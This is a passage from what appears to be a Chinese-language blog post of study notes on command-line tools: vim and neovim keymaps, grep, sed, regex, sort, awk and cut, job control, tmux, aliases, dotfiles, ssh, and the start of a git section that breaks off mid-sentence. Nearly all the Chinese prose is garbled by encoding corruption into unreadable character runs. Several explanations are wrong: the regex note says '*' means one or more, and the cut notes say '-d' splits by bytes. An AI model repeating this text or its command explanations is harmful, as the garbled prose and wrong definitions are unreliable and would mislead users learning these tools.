<span class="keyword">undo</span></span><br><span class="line">ctrl + r   <span class="keyword">redo</span> æ¢å¤æ’¤é”€çš„å†…å®¹</span><br></pre></td></tr></table></figure><ul><li>visual mode: å…è®¸æˆ‘ä»¬æ”¹å˜ä¸€åˆ—ï¼Œæ•´å—å¤åˆ¶ç­‰</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v   å­—ç¬¦å¯è§†ï¼Œå¼€å§‹å’Œç»“æŸä¸¤ä¸ªå­—ç¬¦ä¸­é—´æ‰€æœ‰å†…å®¹ï¼Œé€€å‡ºæŒ‰v</span><br><span class="line">V   è¡Œå¯è§†è¡Œï¼Œå…‰æ ‡æ‰€åœ¨è¡Œï¼Œé€€å‡º V</span><br><span class="line">ctrl+v   å—å¯è§†ï¼Œå¼€å§‹å’Œç»“æŸå…‰æ ‡çš„çŸ©é˜µï¼Œé€€å‡ºctrl+v</span><br></pre></td></tr></table></figure><ul><li>æœç´¢</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">f</span><span class="symbol">&lt;word&gt;</span>  æœ¬è¡ŒæŸ¥æ‰¾</span><br><span class="line">/<span class="symbol">&lt;word&gt;</span>  æŸ¥å†…å®¹,å…¨æ–‡</span><br><span class="line">n      ç»§ç»­å‘ä¸‹ç»§ç»­æ‰¾ <span class="keyword">next</span></span><br><span class="line"><span class="keyword">N</span>      ç»§ç»­å‘ä¸Šæ‰¾</span><br></pre></td></tr></table></figure><ul><li>æ›´æ”¹ç¯å¢ƒ</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:<span class="keyword">set</span> <span class="keyword">nu</span>   æ˜¾ç¤ºè¡Œå·</span><br></pre></td></tr></table></figure><ul><li><p><code>~</code> åè½¬å¤§å°å†™</p></li><li><p>æ‹¬å·åŒ¹é…</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%   åˆ°åŒ¹é…çš„å¦ä¸€ä¸ªæ‹¬å·å¤„</span><br></pre></td></tr></table></figure><ul><li>tab, window, buffer</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tab: æˆ‘ç†è§£ä¸º åœ¨ç³»ç»Ÿä¸­æ‰“å¼€vimè¿™ä¸ªè½¯ä»¶ä¸¤æ¬¡ï¼Œå°±æ˜¯ä¸¤ä¸ªtab</span><br><span class="line"></span><br><span class="line">window: vim å±å¹•ï¼Œå¯ä»¥åˆ†å±</span><br><span class="line"></span><br><span class="line">buffer: æ‰“å¼€æ–‡ä»¶ï¼Œæ–‡ä»¶å…·æœ‰buffer, åŒä¸€ä¸ªæ–‡ä»¶åŒä¸€ä¸ªbuffer,å®æ—¶ã€‚</span><br></pre></td></tr></table></figure><ul><li>é…ç½®ï¼Œvim åœ¨æ‰§è¡Œå‰ä¼šåŠ è½½ä¸€ä¸ª <code>~/.vimrc</code> æ–‡ä»¶ã€‚<ul><li>æˆ‘ä»¬å¯ä»¥DIYè‡ªå·±çš„å–œæ¬¢çš„æŒ‰é”®ã€‚</li><li>å®‰è£…æ’ä»¶å®ç°æ›´å¤šçš„åŠŸèƒ½</li></ul></li></ul><h3 id="neovim"><a href="#neovim" class="headerlink" title="neovim"></a>neovim</h3><ul><li>æœ¬äººä½¿ç”¨ <a href="https://neovim.io/">neovim</a> é…åˆ <a href="https://www.lazyvim.org/">LazyVim</a>ã€‚å¯DIY. ç„¶åå† <code>VsCode</code> å®‰è£…neovimæ’ä»¶ï¼ŒåŒæ­¥ä½¿ç”¨ã€‚</li><li>å¸¸ç”¨çš„æ“ä½œï¼Œneovimä¹Ÿèƒ½ç”¨ã€‚</li></ul><h4 id="keymap"><a href="#keymap" class="headerlink" title="keymap"></a>keymap</h4><ul><li><p>Leader ä¸º space é”®ï¼ŒæŒºå¥½ç”¨, ä½¿ç”¨è¿™äº›åŠŸèƒ½ä¹Ÿéœ€è¦å®‰è£…å¯¹åº”æ’ä»¶</p></li><li><p>æ‰“å¼€ç»ˆç«¯</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>ft   å½“å‰</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fT   /</span><br><span class="line"></span><br><span class="line">ctrl-/    æ‰“å¼€å’Œå…³é—­</span><br></pre></td></tr></table></figure><ul><li>å¿«é€Ÿæ³¨é‡Š</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>gc    ä½†æ˜¯éœ€è¦æŒ‡å®šçš„ LSP</span><br></pre></td></tr></table></figure><ul><li>ä¸åŒæ–‡ä»¶é—´(buffer)åˆ‡æ¢</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>bb</span><br></pre></td></tr></table></figure><ul><li>æ–‡ä»¶æœç´¢ telescope</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- æ–‡ä»¶å</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="symbol">&lt;leader&gt;</span>   <span class="symbol">&lt;esc&gt;</span><span class="symbol">&lt;esc&gt;</span> é€€å‡º</span><br><span class="line"></span><br><span class="line">-- æ–‡ä»¶å†…å®¹</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">sb</span></span><br></pre></td></tr></table></figure><ul><li>æ–‡ä»¶å†…</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;c-s&gt;</span> ä¿å­˜æ–‡ä»¶</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fn  <span class="keyword">new</span> <span class="keyword">file</span></span><br></pre></td></tr></table></figure><ul><li>åˆ†å±</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>|  <span class="symbol">&lt;leader&gt;</span>|  ç”ŸåŠ¨è¡¨ç¤ºç«–ç€</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>-  <span class="symbol">&lt;leader&gt;</span>-  æ¨ªç€</span><br><span class="line"></span><br><span class="line">-- åˆ‡æ¢ï¼Œå’Œ<span class="keyword">normal</span> <span class="keyword">mode</span> ä¸‹çš„ç§»åŠ¨è”ç³»</span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> å·¦</span><br><span class="line"><span class="symbol">&lt;C-j&gt;</span> ä¸‹</span><br><span class="line"><span class="symbol">&lt;C-k&gt;</span> ä¸Š</span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> å³</span><br></pre></td></tr></table></figure><ul><li>ä¾§è¾¹æ  neo-tree</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>fe   å½“å‰</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fE   /</span><br><span class="line"></span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">e</span>   å½“å‰</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>E   /</span><br><span class="line"></span><br><span class="line">-- ä¾§è¾¹æ è¿›å…¥æ–‡ä»¶åï¼Œåœ¨è¿›å…¥ä¾§è¾¹æ </span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> </span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> </span><br></pre></td></tr></table></figure><ul><li>lazy.nvim æ’ä»¶ç®¡ç†éå¸¸å—æ¬¢è¿ã€‚ä½œè€…å¼€å‘çš„æ’ä»¶å’Œé…ç½®ã€‚</li></ul><h2 id="lecture4-data-wrangling"><a href="#lecture4-data-wrangling" class="headerlink" title="lecture4: data wrangling"></a>lecture4: data wrangling</h2><blockquote><p>å¤„ç†æ•°æ®çš„æŸäº›æ‰‹æ®µ</p></blockquote><ul><li>grepï¼Œæœç´¢</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;word&quot;</span> tmp.txt   <span class="comment"># æŸ¥è¯¢</span></span><br><span class="line">-R  <span class="comment"># é€’å½’ï¼Œå¯ä»¥æŸ¥æ‰¾æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><ul><li>sedï¼Œåœ¨æœç´¢æ›¿æ¢æ˜¯ä¸€ä¸ªå¥½ç”¨çš„å·¥å…·ã€‚éœ€è¦å­¦ä¹ ä¸€ä¸‹æ­£åˆ™è¡¨è¾¾å¼</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/&lt;pattern&gt;/&lt;replace&gt;/&#x27;</span></span><br><span class="line">pattern: åŒ¹é…æ¨¡å¼ï¼Œæ”¯æŒæ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">replace: å°†åŒ¹é…åˆ°çš„pattern è½¬æ¢ä¸º replaceã€‚å½“æ•è·æ—¶ \num ä»£è¡¨ç¬¬numä¸ªæ•è·ï¼Œæ‰“å°</span><br><span class="line"></span><br><span class="line"><span class="comment"># sed é»˜è®¤æ”¯æŒå¾ˆè€çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä½¿ç”¨ `-E` å‚æ•°ï¼Œæ”¯æŒç°ä»£åŒ–çš„æ­£åˆ™</span></span><br></pre></td></tr></table></figure><ul><li>ä¸€äº›æ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨ï¼Œä½¿ç”¨åœ¨çº¿ç½‘ç«™ç»ƒä¹ ã€‚regular expression</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[0-9]   0,1,2...9 å…¶ä¸­ä¸€ä¸ªæ•°å­—</span><br><span class="line">*       è´ªå©ªæ¨¡å¼ï¼Œ1æ¬¡æˆ–å¤šæ¬¡</span><br><span class="line">?       0 æˆ– 1 æ¬¡</span><br><span class="line">.       ä»»æ„å­—ç¬¦</span><br><span class="line">()      æ•è·æ‹¬å·å†…çš„å†…å®¹</span><br><span class="line">^ å¼€å¤´   $ æœ«å°¾</span><br></pre></td></tr></table></figure><ul><li>wc</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l    word count,ç»Ÿè®¡å¤§å° -l line å‡ è¡Œ</span><br></pre></td></tr></table></figure><ul><li><p>æ’åºï¼Œå­—å…¸åºã€‚å»é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span>    é»˜è®¤å­—å…¸åºæ’åº</span><br><span class="line">-n æŒ‰ç…§æ•°å€¼çš„å¤§å°è¿›è¡Œæ’åº</span><br><span class="line">-k æŒ‡å®šæ’åºçš„åˆ—æ•°</span><br><span class="line"><span class="built_in">uniq</span>    å¯å»é™¤é‡å¤å†…å®¹</span><br><span class="line">-c  è®°å½•å‡ºç°æ¬¡æ•°</span><br></pre></td></tr></table></figure></li><li><p>awkï¼ŒåŸºäºæµçš„å¤„ç†ï¼Œæ˜¯ä¸€é—¨ç¼–ç¨‹è¯­è¨€</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;script&#x27;</span>  æ‰§è¡Œä¸€ä¸ªè„šæœ¬</span><br><span class="line">awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">-F  æŒ‡å®šåˆ†éš”ç¬¦</span><br></pre></td></tr></table></figure><ul><li>cutï¼Œç±»ä¼¼ç¼–ç¨‹è¯­è¨€çš„split</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cut</span> [option] filename</span><br><span class="line">-d   å­—èŠ‚ä¸ºå•ä½åˆ†å‰²  </span><br><span class="line"><span class="built_in">cut</span> -d 3  ç¬¬ä¸‰ä¸ªå­—ç¬¦  -d 3-9,12  ç¬¬3-9,12ä¸ªå­—ç¬¦</span><br><span class="line">-f   fields ä¸-dä¸€èµ·ä½¿ç”¨ï¼Œè¡¨ç¤ºåŒºåŸŸ</span><br><span class="line"><span class="built_in">cut</span> -d : -f2  ç¬¬1-2ä¸ªå†’å·ä¹‹å‰çš„å†…å®¹</span><br><span class="line">-c   character å­—ç¬¦ä¸ºå•ä½ï¼Œå¤„ç†ä¸­æ–‡å¥½ç”¨</span><br><span class="line">-b   </span><br></pre></td></tr></table></figure><ul><li>ç¼–ç¨‹è¯­è¨€åœ¨å‘½ä»¤è¡Œçš„ä½¿ç”¨? å„ç§ç®¡é“ï¼Œå›¾ç‰‡éŸ³é¢‘å¤„ç†?</li></ul><h2 id="lecture5-command-line-environment"><a href="#lecture5-command-line-environment" class="headerlink" title="lecture5: command-line environment"></a>lecture5: command-line environment</h2><blockquote><p>ä¼˜é›…çš„ä½¿ç”¨å‘½ä»¤è¡Œ</p></blockquote><h3 id="job-control"><a href="#job-control" class="headerlink" title="job control"></a>job control</h3><ul><li>Linux ç³»ç»Ÿçš„ signalæœºåˆ¶</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">man signal : ä¼šçœ‹åˆ°ä¸åŒçš„number å’Œ name</span><br><span class="line"></span><br><span class="line">ctrl-c   SIGINT   signal interrupt</span><br><span class="line">ctrl-\   SIGQUIT</span><br></pre></td></tr></table></figure><ul><li>ctrl+z</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æš‚åœï¼Œå¯æ‰§è¡Œå…¶ä»–ä»»åŠ¡</span></span><br><span class="line">&amp;     åœ¨å‘½ä»¤ååŠ å…¥ï¼Œè¡¨ç¤ºåå°æ‰§è¡Œ</span><br><span class="line"><span class="built_in">jobs</span>  æŸ¥çœ‹åå°ä»»åŠ¡ï¼Œæš‚åœæˆ–è€…è¿è¡Œ pid</span><br><span class="line"><span class="built_in">fg</span> %num / <span class="built_in">bg</span> %num  ä½¿æš‚åœçš„ä»»åŠ¡ç»§ç»­è¿è¡Œï¼Œ<span class="built_in">fg</span> æ¢å¤åˆ°å‰å°ã€‚<span class="built_in">bg</span> æ¢å¤åˆ°åå°æ‰§è¡Œã€‚front back ground</span><br><span class="line"><span class="built_in">kill</span> %num            åœæ­¢</span><br></pre></td></tr></table></figure><h3 id="terminal-multiplexers"><a href="#terminal-multiplexers" class="headerlink" title="terminal multiplexers"></a>terminal multiplexers</h3><ul><li><p>ç»ˆç«¯å¤ç”¨ï¼Œåœ¨ä¸€ä¸ªterminal windowå¹²å¾ˆå¤šäº‹æƒ…ã€‚</p></li><li><p>å¾ˆå¤šçš„ç»ˆç«¯éƒ½å­˜åœ¨åˆ†å±ç­‰æ“ä½œï¼Œä½†æ˜¯è¯¾ç¨‹ä»‹ç»ç¥å™¨ <code>tmux</code>ï¼Œæ›´åŠ ç¥å¥‡ã€‚</p><ul><li>ä¸ kill sessionï¼Œå…¶ä¸­çš„å‘½ä»¤ä¼šä¸€ç›´æ‰§è¡Œä¸‹å»ã€‚åªéœ€è¦å¼€å¯ä¸€æ¬¡ç»ˆç«¯ã€‚</li><li>åœ¨ssh æœåŠ¡å™¨æ—¶éå¸¸çš„å¥½ç”¨</li></ul></li><li><p>session, window, pune</p><ul><li>å¯åŠ¨tmux, ä¼šå¼€å¯ä¸€ä¸ªsession, æ˜æ˜¾çš„æ˜¯ä¸‹é¢ä¼šå‡ºç°ä¸€è¡Œæ•°æ®ã€‚</li><li>window åˆ›å»ºä¸€ä¸ªæ–°çš„shell ç»ˆç«¯ã€‚</li><li>pune é¢æ¿ï¼Œä¸€ä¸ªçª—å£å¯ä»¥åˆ†å¾ˆå¤šçš„é¢æ¿ã€‚</li></ul></li><li><p>å‘½ä»¤è¡Œæ“ä½œ</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tmux</span><br><span class="line">ä¸‹éƒ¨ä¼šå‡ºç°çŠ¶æ€æ ï¼Œåˆ†åˆ«æ˜¯session window1 windiow2...     æ—¶é—´ç­‰</span><br><span class="line"></span><br><span class="line">tmux a   <span class="comment"># attach è¿›å…¥session</span></span><br><span class="line">-t name  æŒ‡å®šåç§°</span><br><span class="line"></span><br><span class="line">tmux new -t &lt;name&gt;       åˆ›å»ºå¹¶æŒ‡å®šåç§°</span><br><span class="line">tmux kill-session -t &lt;num/name&gt;  æ€æ­»æŒ‡å®šçš„session</span><br><span class="line"></span><br><span class="line">tmux <span class="built_in">ls</span>   æŸ¥çœ‹æ‰€æœ‰çš„session</span><br><span class="line"></span><br><span class="line">tmux splitw -h/-v   pane æ¨ªç«–åˆ†å‰²window</span><br></pre></td></tr></table></figure><ul><li>é»˜è®¤å¿«æ·é”®ã€‚å¯ä»¥å…ˆæŒ‰ä¸€ä¸‹ <code>ctrl-b</code> åœ¨æŒ‰å…¶ä½™çš„ï¼Œä¸éœ€è¦åŒæ—¶æŒ‰ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">prefix = Ctrl-b</span><br><span class="line"><span class="comment"># session prefix keymap</span></span><br><span class="line">prefix d   dettach session</span><br><span class="line">prefix s   åˆ—å‡ºæ‰€æœ‰session vimå¿«æ·é”®ä¸‹çš„é€‰æ‹©</span><br><span class="line"></span><br><span class="line"><span class="comment"># window</span></span><br><span class="line">prefix c   create a new window</span><br><span class="line">prefix p   previous window</span><br><span class="line">prefix n   next window</span><br><span class="line">prefix &lt;n&gt; ç¬¬nä¸ªçª—å£,næ˜¯ä¸ªæ•°å­—</span><br><span class="line">prefix w   åˆ—å‡ºwindow å’Œ session(s ?),  jk é€‰æ‹©ï¼Œenterè¿›å…¥</span><br><span class="line">prefix ,   é‡å‘½å</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pune</span></span><br><span class="line">prefix x       å…³é—­pune</span><br><span class="line">prefix %       ç«–ç›´åˆ‡å‰²</span><br><span class="line">prefix <span class="string">&quot;       æ°´å¹³åˆ‡å‰²</span></span><br><span class="line"><span class="string">prefix æ–¹å‘é”®   é€‰æ‹© pune</span></span><br><span class="line"><span class="string">prefix x       å…³é—­pune</span></span><br><span class="line"><span class="string">prefix z       æœ€å¤§åŒ–å½“å‰çª—å£ï¼Œåœ¨æŒ‰ä¸€æ¬¡é€€å‡º</span></span><br><span class="line"><span class="string">prefix !       åˆ†ç¦»pune è¿›å…¥window</span></span><br><span class="line"><span class="string">æŒç»­æŒ‰prefix æ–¹å‘é”®  æ”¹å˜puneå¤§å°</span></span><br></pre></td></tr></table></figure><ul><li><p>é…ç½®å¿«æ·é”®ï¼Œ <code>~/.tmux.conf</code>ã€‚æˆ‘ä½¿ç”¨çš„æ˜¯åŸºäºç½‘ä¸Šæ‰¾çš„ <a href="https://www.debugpointer.com/linux/tmux-conf">tmux-conf</a>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctrl-b è·ç¦»éå¸¸æœ‰ç‚¹é˜´é—´ï¼Œå› æ­¤éœ€è¦æ”¹ã€‚ctrl-a æ˜¯qemuå¿«æ·é”®ã€‚å› æ­¤é€‰æ‹©ctrl-x</span><br><span class="line"></span><br><span class="line">prefix I             install plugins</span><br><span class="line">prefix alt I         uninstall</span><br><span class="line"></span><br><span class="line">alt + æ–¹å‘é”®ï¼Œpune ç§»åŠ¨</span><br></pre></td></tr></table></figure></li><li><p>æ’ä»¶ç®¡ç† <a href="https://github.com/tmux-plugins/tpm">Tmux Plugin Manager</a></p></li><li><p>ç¾åŒ–+å¿«æ·é”® ç³»åˆ—æ“ä½œå‚è€ƒã€‚<a href="https://github.com/rothgar/awesome-tmux#themes">awesome-tmux: A list of awesome resources for tmux</a></p></li></ul><h3 id="aliases"><a href="#aliases" class="headerlink" title="aliases"></a>aliases</h3><ul><li>ç»™å¸¸ç”¨çš„å‘½ä»¤è®¾ç½®åˆ«å <ul><li>bash çš„<code>~/.bashrc</code> æ–‡ä»¶</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ³¨æ„ï¼Œä¸è¦å­˜åœ¨ ll = &#x27;ls -l&#x27; å› ä¸ºåœ¨shell scriptä¸­ï¼Œç©ºæ ¼æ˜¯æœ‰æ„ä¹‰çš„</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -alF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="dotfiles"><a href="#dotfiles" class="headerlink" title="dotfiles"></a>dotfiles</h3><ul><li><p>å„ç§é…ç½®æ–‡ä»¶ã€‚å¤§éƒ¨åˆ†æ˜¯æ–‡ä»¶</p></li><li><p>bash -&gt; <code>~/.bashrc</code></p></li><li><p>zsh -&gt; <code>~/.zshrc</code>ã€‚æˆ‘ä»¬çš„zshç¾åŒ–ä¹Ÿæ˜¯ä¿®æ”¹æ­¤æ–‡ä»¶ã€‚</p></li><li><p>vim -&gt; <code>~/.vimrc</code></p></li><li><p>tmux -&gt; <code>~/tmux.conf</code></p></li><li><p>neovim -&gt; <code>~/.config/nvim</code> ç›®å½•ä¸‹çš„ <code>åŸºäºlua</code> é…ç½®</p></li><li><p>ssh -&gt; <code>~/.ssh</code> è¿™æ˜¯ä¸€ä¸ªç›®å½•ã€‚å¯ä»¥é…ç½®å…¬ç§é’¥ï¼Œå…å¯†ç™»å½•ã€‚</p><ul><li>è‡ªå·±çš„æœºå™¨ <code>ssh-keygen</code> å‘½ä»¤ç”Ÿæˆå…¬ç§é’¥</li><li>å°†å…¬é’¥æ”¾å…¥æœåŠ¡å™¨çš„ <code>authorized_keys</code>ã€‚æƒé™ä¸€èˆ¬æ˜¯<code>600</code></li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pubÂ  &lt;username&gt;@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸¸ç”¨çš„ssh ä¼ è¾“æ–‡ä»¶ scp  å’Œcpå‘½ä»¤å·®ä¸å¤šï¼Œç»™å‡ºè·¯å¾„</span></span><br><span class="line">scp tmp.txt &lt;user&gt;@&lt;IP&gt;:/tmp</span><br></pre></td></tr></table></figure><ul><li><p>æ„Ÿå…´è¶£çš„å¯ä»¥å­¦ä¹ ä¸€ä¸‹ <a href="https://nixos.org/">NixOS</a>, ä¸€ä¸ªåŸºäºé…ç½®æ–‡ä»¶çš„æ“ä½œç³»ç»ŸğŸ˜‹</p></li><li><p>å¤§éƒ¨åˆ†é…ç½®éƒ½å¯åœ¨ github æŸ¥æ‰¾åˆ°ï¼Œå¦‚æœä¸æƒ³è‡ªå·±é…ç½®ï¼Œç›´æ¥ <code>clone/fork</code> ä¸€ä¸ªå…¶ä»–äººçš„ã€‚</p></li><li><p>bash å‰é¢çš„ä¸€ä¸²çš„ä¿®æ”¹</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS1=<span class="string">&quot;user&gt;&quot;</span>   æˆ‘ä»¬shell å‰é¢çš„ä¸€ä¸²</span><br></pre></td></tr></table></figure><blockquote><p>é—®é¢˜ï¼šå¦‚ä½•åœ¨æœ¬æœºå’ŒæœåŠ¡å™¨åŒæ—¶ä½¿ç”¨tmux</p></blockquote><p>ç›¸åŒçš„é…ç½®ä¼šå¯èƒ½äº§ç”Ÿå†²çªï¼Œæˆ–è€…ä¼šä½¿æˆ‘ä»¬ä¸çŸ¥é“æ“ä½œçš„æ˜¯å“ªä¸€ä¸ªï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸åŒçš„é…ç½®æ–‡ä»¶ã€‚æœ€ç®€å•çš„å°±æ˜¯ä½¿ç”¨ä¸¤ä¸ª <code>prefix</code> ã€‚</p><h2 id="lecture6-virsion-control-git"><a href="#lecture6-virsion-control-git" class="headerlink" title="lecture6: virsion control(git)"></a>lecture6: virsion control(git)</h2><blockquote><p>gitç‰ˆæœ¬æ§åˆ¶</p></blockquote><ul><li><p>å¼€å‘é¡¹ç›®ï¼Œå›¢é˜Ÿåˆä½œï¼Œæ–‡ä»¶æŸåçš„å›é€€ã€‚ã€‚ã€‚gitéƒ½å¯ä»¥åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå¸®åŠ©æˆ‘ä»¬ï¼Œä¸éœ€è¦åˆ é™¤åœ¨é‡æ–°ä¸‹è½½ğŸ˜˜</p></li><li><p>git æŠ½è±¡å»ºæ¨¡ã€‚ä½¿ç”¨æœ‰å‘æ— ç¯å›¾è¿›è¡ŒæŠ½è±¡</p><ul><li>é¡¶å±‚rootï¼Œæ–‡ä»¶å¤¹æŠ½è±¡ä¸º<code>tree</code>, æ–‡ä»¶æŠ½è±¡ä¸º<code>blob</code></li><li>commit: æ¯æ¬¡commit äº§ç”Ÿä¸€ä¸ªç±»ä¼¼ <code>snapshot(å¿«ç…§)</code>çš„ä¸œè¥¿ï¼Œä¿å­˜å½“å‰çš„çŠ¶æ€ä»¥åŠä¸€äº›ä¿¡æ¯(ä½œè€…ï¼Œæè¿°â€¦)ã€‚</li><li>é€šè¿‡ <code>mapping&lt;string, object&gt;</code> è¿›è¡Œç®¡ç†.stringæŒ‡æ–‡ä»¶çš„å“ˆå¸Œå€¼(SHA-1)ï¼Œobjectæ˜¯æˆ‘ä»¬æ–‡ä»¶ä¿å­˜çš„åœ°å€(â€˜snapshotâ€™åœ¨ç£ç›˜ä¸­çš„åœ°å€)ã€‚æ¯æ¬¡ä¿®æ”¹ï¼Œcommitä¼šäº§ç”Ÿæ–°çš„hash</li></ul></li><li><p>reference: gitéœ€è¦çš„æ˜¯æ–‡ä»¶çš„å“ˆå¸Œå€¼ï¼Œå¯¹äºäººç±»æ¯«æ— æ„ä¹‰ï¼Œå› æ­¤å­˜åœ¨å¦ä¸€ä¸ª <code>mapping&lt;string, string&gt;</code> 